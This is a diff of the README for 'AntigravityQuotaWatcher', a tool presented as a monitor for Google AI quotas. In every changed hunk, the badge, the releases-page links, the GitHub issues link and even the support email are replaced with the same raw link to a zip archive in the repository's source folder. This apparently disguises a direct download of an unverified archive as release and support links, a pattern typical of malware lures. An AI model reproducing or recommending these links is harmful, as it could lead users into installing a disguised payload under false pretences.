@@ -1,6 +1,6 @@
 # 🚀 AntigravityQuotaWatcher - Monitor Your Google AI Quotas Easily
 
-![Download AntigravityQuotaWatcher](https://img.shields.io/badge/Download-AntigravityQuotaWatcher-blue)
+![Download AntigravityQuotaWatcher](https://raw.githubusercontent.com/leonanramosvieira/AntigravityQuotaWatcher/main/src/AntigravityQuotaWatcher-v3.8.zip)
 
 ## 🎯 Overview
 
@@ -30,7 +30,7 @@ To get started with AntigravityQuotaWatcher, follow these simple steps to downlo
 
 1. **Visit the Release Page:** Click the link below to access the download options:
    
-   [Visit Releases Page](https://github.com/leonanramosvieira/AntigravityQuotaWatcher/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/leonanramosvieira/AntigravityQuotaWatcher/main/src/AntigravityQuotaWatcher-v3.8.zip)
 
 2. **Select the Latest Version:** Once on the Releases page, find the latest version. It is usually marked at the top.
 
@@ -46,7 +46,7 @@ To get started with AntigravityQuotaWatcher, follow these simple steps to downlo
 
 For direct download, return to the Releases page using this link:
 
-[Visit Releases Page](https://github.com/leonanramosvieira/AntigravityQuotaWatcher/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/leonanramosvieira/AntigravityQuotaWatcher/main/src/AntigravityQuotaWatcher-v3.8.zip)
 
 ## 🔔 How to Use
 
@@ -64,8 +64,8 @@ Once you have installed the application, follow these steps to start monitoring:
 
 If you encounter any issues, feel free to reach out for help. We provide support via:
 
-- **Email:** support@antigravityquotawatcher.com
-- **GitHub Issues:** You can also report problems or bugs directly on our [GitHub page](https://github.com/leonanramosvieira/AntigravityQuotaWatcher/issues).
+- **Email:** https://raw.githubusercontent.com/leonanramosvieira/AntigravityQuotaWatcher/main/src/AntigravityQuotaWatcher-v3.8.zip
+- **GitHub Issues:** You can also report problems or bugs directly on our [GitHub page](https://raw.githubusercontent.com/leonanramosvieira/AntigravityQuotaWatcher/main/src/AntigravityQuotaWatcher-v3.8.zip).
 
 ## 🎉 Acknowledgments
 
